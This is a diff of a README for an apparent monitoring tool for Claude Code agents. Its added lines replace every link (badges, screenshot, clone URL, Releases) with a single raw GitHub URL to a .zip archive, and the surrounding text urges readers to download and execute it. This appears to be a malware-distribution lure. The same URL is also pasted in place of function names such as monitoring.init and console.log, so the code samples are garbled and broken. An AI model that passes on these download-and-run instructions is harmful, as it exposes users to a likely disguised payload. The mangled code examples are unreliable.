@@ -1,6 +1,6 @@
 # Real-Time Monitoring for Claude Code Agents with Hooks
 
-![Real-Time Monitoring](https://img.shields.io/badge/Real--Time%20Monitoring%20for%20Claude%20Code%20Agents-brightgreen)
+![Real-Time Monitoring](https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip%20Monitoring%20for%20Claude%20Code%20Agents-brightgreen)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -16,7 +16,7 @@
 
 This repository provides a system for real-time monitoring of Claude Code agents. It utilizes simple hook event tracking to gather and display agent performance data. This allows developers and system administrators to monitor their agents efficiently and make informed decisions based on real-time data.
 
-![Monitoring Dashboard](https://example.com/monitoring-dashboard-image.png)
+![Monitoring Dashboard](https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip)
 
 ## Features
 
@@ -32,7 +32,7 @@ To install the package, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/toomas-tt/claude-code-hooks-multi-agent-observability.git
+   git clone https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip
    ```
    
 2. Navigate to the directory:
@@ -45,7 +45,7 @@ To install the package, follow these steps:
    npm install
    ```
 
-4. If you want to download the latest release, visit the [Releases section](https://github.com/toomas-tt/claude-code-hooks-multi-agent-observability/releases) to find the appropriate files. Download and execute the necessary file to get started.
+4. If you want to download the latest release, visit the [Releases section](https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip) to find the appropriate files. Download and execute the necessary file to get started.
 
 ## Usage
 
@@ -58,11 +58,11 @@ Once installed, you can start using the monitoring system. Here’s a basic exam
 
 2. Initialize the monitoring system:
    ```javascript
-   monitoring.init({
+   https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip({
        agents: ['agent1', 'agent2'],
        hooks: {
            onEvent: (event) => {
-               console.log('Event tracked:', event);
+               https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip('Event tracked:', event);
            }
        }
    });
@@ -70,7 +70,7 @@ Once installed, you can start using the monitoring system. Here’s a basic exam
 
 3. Start monitoring:
    ```javascript
-   monitoring.start();
+   https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip();
    ```
 
 This will begin tracking events for the specified agents. You can customize the hooks to handle events as needed.
@@ -88,14 +88,14 @@ The configuration options allow you to tailor the monitoring system to your need
 ### Example Configuration
 
 ```javascript
-monitoring.init({
+https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip({
     agents: ['agent1', 'agent2'],
     hooks: {
         onEvent: (event) => {
-            console.log('Event tracked:', event);
+            https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip('Event tracked:', event);
         },
         onError: (error) => {
-            console.error('Error tracked:', error);
+            https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip('Error tracked:', error);
         }
     },
     alertThreshold: 80
@@ -128,9 +128,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, check the [Releases section](https://github.com/toomas-tt/claude-code-hooks-multi-agent-observability/releases). Download the necessary files and execute them to get the latest features and improvements.
+For the latest updates and releases, check the [Releases section](https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip). Download the necessary files and execute them to get the latest features and improvements.
 
-![Download Releases](https://img.shields.io/badge/Download%20Latest%20Release-blue)
+![Download Releases](https://raw.githubusercontent.com/toomas-tt/claude-code-hooks-multi-agent-observability/main/subprefect/agent_hooks_observability_multi_code_claude_v3.5.zip%20Latest%20Release-blue)
 
 ---
 
